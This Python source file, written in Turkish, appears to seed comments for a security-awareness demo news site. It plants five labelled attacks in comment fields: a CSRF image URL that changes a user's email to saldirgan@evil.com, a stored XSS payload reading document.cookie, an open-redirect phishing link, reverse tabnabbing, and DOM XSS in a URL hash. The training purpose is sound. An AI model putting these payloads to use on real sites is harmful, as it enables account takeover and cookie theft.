"""Yorumlar (demo, bellekte tutulur -- posts.py gibi, DB yok).

Yapi:  COMMENTS[slug] = [ {yazar, metin, resim}, ... ]
  yazar : yorumu yazan kullanici
  metin : yorum metni (HTML olabilir -- zafiyetin kaynagi tam da bu)
  resim : istege bagli bir gorsel URL'si (kullanici yorumuna resim ekleyebilir)
          -> CSRF demosunda saldirgan tam da burayi kotuye kullanacak.

Bes tuzak, konusuyla ortusen habere ekildi: kripto hirsizligi haberinde sahte
"guvenlik rehberi" linki, parolasiz kimlik dogrulama haberinde hesap ayari
tuzagi, performans haberinde "hiz testi" linki gibi. Boylece tuzak, haberin
yorumlarinda dogal duruyor -- gercek kimlik avinin calisma bicimi de budur.

DIKKAT: anahtarlar posts.py'deki slug'larla eslesmek zorunda.
"""

COMMENTS = {
    # --- CSRF tuzagi (resim alaninda e-posta degistirme adresi) -------------
    # Hesap guvenligi haberinin altinda, hesap ayariyla oynayan bir tuzak.
    "parolasiz-kimlik-dogrulama-passkey": [
        {"yazar": "mehmet58", "metin": "Sonunda. Parola ezberlemekten bıktım açıkçası.", "resim": ""},
        {"yazar": "ays_e", "metin": "Passkey'i bankamda kullanmaya başladım, geri dönmem.", "resim": ""},
        {"yazar": "deniz", "metin": "Güzel özet olmuş, bir de şu karşılaştırma görseline bakın 👇", "resim": "/hesap/email-degistir?email=saldirgan@evil.com"},
    ],

    # --- STORED XSS tuzagi (yorum METNINE gizlenmis kod) --------------------
    # Gorunur metin masum; sonundaki gizli <img> yuklenemeyince onerror calisir,
    # kurbanin cerezini okuyup farkindalik fonksiyonuna verir.
    "chainalysis-ajan-tabanli-sizma": [
        {"yazar": "teknosever", "metin": "Ajanların saldırı tarafında kullanılması çok konuşulacak.", "resim": ""},
        {"yazar": "x_kullanici", "metin": "Bence de çok yerinde tespitler 👏 <img src=x style=\"display:none\" onerror=\"window.xssYakala && window.xssYakala(document.cookie)\">", "resim": ""},
    ],

    # --- OPEN REDIRECT tuzagi ----------------------------------------------
    # Link METNI guvenilir gorunuyor, href ise /git ile sahte giris sayfasina
    # gidiyor (metin != href = klasik kimlik avi).
    "binance-alti-milyar-dolar": [
        {"yazar": "guvenlik_dostu", "metin": "Çok önemli bir konu. Resmî güvenlik rehberine buradan ulaşabilirsiniz: <a href=\"/git?url=http://127.0.0.1:8000/sahte-giris\">teknopanorama.com/guvenlik-rehberi</a>", "resim": ""},
        {"yazar": "kripto_meraklisi", "metin": "Borsanın zararı kendi üstlenmesi iyi ama asıl soru nasıl girdikleri.", "resim": ""},
    ],

    # --- REVERSE TABNABBING tuzagi -----------------------------------------
    # target=_blank + rel=opener olan dis link. Yeni sekmede acilan sayfa
    # window.opener ile eski sekmeyi ele gecirir.
    "apple-m6-cihaz-ustu-yapay-zeka": [
        {"yazar": "devtools_fan", "metin": "Bu aracı denemelisiniz, cihazınızın hızını gerçekten iyi ölçüyor: <a href=\"/tab-saldirgan\" target=\"_blank\" rel=\"opener\">speedtest-pro.com</a>", "resim": ""},
        {"yazar": "mac_kullanicisi", "metin": "Beş kat rakamının tek bir testten geldiğini yazmanız iyi olmuş.", "resim": ""},
    ],

    # --- DOM-BASED XSS tuzagi ----------------------------------------------
    # Davet linki; payload URL'nin hash (#) kisminda. Hash sunucuya gitmez,
    # /davet sayfasi onu client'ta innerHTML'e yazinca calisir.
    "matrix-game-acik-kaynak-dunya-modeli": [
        {"yazar": "davetci", "metin": "Modeli deneyenler için bir topluluk kurduk, seni de davet ediyorum: <a href=\"/davet#%3Cimg%20src%3Dx%20onerror%3DxssDom()%3E\">davet linkin hazır 🎉</a>", "resim": ""},
        {"yazar": "oyuncu_42", "metin": "18,5 GB bellek kullanımı tüketici kartları için hâlâ sınırda.", "resim": ""},
    ],

    # --- Tuzaksiz yorumlar (site canli gorunsun diye) ----------------------
    "batarya-depolama-gaz-turbinini-gecti": [
        {"yazar": "enerjici", "metin": "Yatırım maliyetinin ilk kez artması asıl haber bence.", "resim": ""},
        {"yazar": "mehmet58", "metin": "Ömür boyu maliyet ile kurulum maliyetini ayırmanız iyi olmuş.", "resim": ""},
    ],
    "kucuk-modeller-cevrimdisi-calisiyor": [
        {"yazar": "ays_e", "metin": "4 GB'a sığan bir model gerçekten işe yarıyorsa oyun değişir.", "resim": ""},
    ],
    "epdk-sarj-istasyonu-depolama": [
        {"yazar": "elektrikli_surucu", "metin": "Otoyollarda hızlı şarj sayısı artarsa menzil kaygısı biter.", "resim": ""},
    ],
}


def yorumlar(slug: str):
    """Bir yazinin yorumlarini dondurur (yoksa bos liste)."""
    return COMMENTS.get(slug, [])


def yorum_ekle(slug: str, yazar: str, metin: str, resim: str = ""):
    """Yeni yorum ekler."""
    COMMENTS.setdefault(slug, []).append({
        "yazar": yazar,
        "metin": metin,
        "resim": resim,
    })
